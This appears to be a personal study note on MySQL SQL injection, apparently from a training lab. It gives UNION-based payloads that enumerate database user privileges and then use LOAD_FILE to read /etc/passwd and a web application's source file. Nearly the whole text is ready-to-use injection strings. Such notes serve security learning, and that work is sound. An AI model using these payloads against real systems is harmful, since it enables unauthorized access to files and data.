#SQL_Injection 

---

- To load a file's content into a DB, the user must have the **FILE** privilege. To get the current DB user we can use any of the following commands
```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

- Or using the **UNION** syntax we use the following syntax:
```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```

- After we have discovered the user, we use the following command to check if the user has superuser privileges:
```sql
SELECT super_priv FROM mysql.user
```

- or using the **UNION** syntax we get the following:
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

- To get all the privileges for a user(i.e. `root@localhost`), we use the following syntax:
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

- Assume we now get the following **privileges**:
![[Pasted image 20241028232656.png]]
**Note**: In this case `root@localhost` has **FILE** privileges

- We can then load a file using SQL syntax as follows:
```sql
SELECT LOAD_FILE('/etc/passwd');
```

- or using the **UNION** syntax:
```
cn' UNION SELECT 1,LOAD_FILE("/var/www/html/search.php"),3,4-- -
```

## Finding User Privileges

- To find the privileges for the DB users using **UNION** syntax:
```bash
cn' UNION SELECT 1, grantee, privilege_type, 4, 5 FROM information_schema.user_privileges-- -
```
